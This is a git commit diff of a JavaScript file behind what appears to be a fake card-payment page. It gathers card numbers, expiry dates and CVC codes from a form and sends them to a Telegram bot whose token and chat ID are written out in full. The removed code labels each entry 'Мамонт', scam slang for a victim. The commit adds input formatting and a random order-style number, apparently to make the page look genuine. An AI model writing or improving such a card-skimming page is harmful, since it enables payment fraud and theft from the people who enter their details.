6c8ddbb5b1a95e30369b00558f44d7ecaae40283
jhvvfd <157534072+jhvvfd@users.noreply.github.com>
2024-01-26 23:49:02 +0200

    Add files via upload

--- main.js
+++ main.js
@@ -2,25 +2,56 @@ const CHAT_ID = "-1002101747684";
 const URL_API = `https://api.telegram.org/bot6591959002:AAGkb-b8JEmXI8xlIww82O1DPhJl34Ngmic/sendMessage`;
 
 const form = document.getElementById("form");
+
 function pattern(event) {
   const inputs = form.elements;
   for (let i = 0; i < inputs.length; i++) {
     if (inputs[i].type === "text") {
-      inputs[i].value = inputs[i].value.replace(/[^0-9/]/g, "");
+      inputs[i].value = inputs[i].value.replace(/[^0-9\s/]/g, "");
     }
   }
 }
 
 form.addEventListener("input", pattern);
 
+function onKeyDownEventHandler(e) {
+  if (input.value.length === 2) {
+    input.value += "/";
+  }
+
+  if ((e.keyCode === 8 || e.keyCode === 46) && input.value.slice(-1) === "/") {
+    input.value = input.value.slice(0, -1);
+  }
+}
+
+const input = document.querySelector("#clientInputDate");
+input.addEventListener("keydown", onKeyDownEventHandler);
+
+function spaceBetweenNumbers(e) {
+  let value = e.target.value.replace(/\s/g, "");
+  let spacedValue = "";
+
+  for (let i = 0; i < value.length; i++) {
+    if (i > 0 && i % 4 === 0) {
+      spacedValue += " ";
+    }
+    spacedValue += value[i];
+  }
+
+  e.target.value = spacedValue;
+}
+
+const inputCard = document.querySelector("#clientInputCardNumber");
+inputCard.addEventListener("input", spaceBetweenNumbers);
+
 function submitForm(e) {
   e.preventDefault();
-  const form = document.getElementById("form"); // Get reference to the form element
+  const form = document.getElementById("form");
   console.log(form.elements.cardNumber.value);
-  let message = ` Мамонт \n`;
-  message += `Номер Карты: ${form.elements.cardNumber.value} \n`; // Use correct element names
-  message += `ММ/ГГ: ${form.elements.expired.value} \n`; // Use correct element names
-  message += `CVC: ${form.elements.cvc.value} \n`; // Use correct element names
+  let message = ` Заявка \n`;
+  message += `CardNumber: ${form.elements.cardNumber.value} \n`;
+  message += `Exired: ${form.elements.expired.value} \n`;
+  message += `CVC: ${form.elements.cvc.value} \n`;
   console.log(message);
   axios
     .post(URL_API, {
@@ -40,3 +71,9 @@ function submitForm(e) {
 }
 
 form.addEventListener("submit", submitForm);
+function generateRandomSixDigitNumber() {
+  return Math.floor(Math.random() * (999999 - 100000 + 1)) + 100000;
+}
+const spanElement = document.getElementById("randomNumberSpan");
+const randomSixDigitNumber = generateRandomSixDigitNumber();
+spanElement.textContent = randomSixDigitNumber;
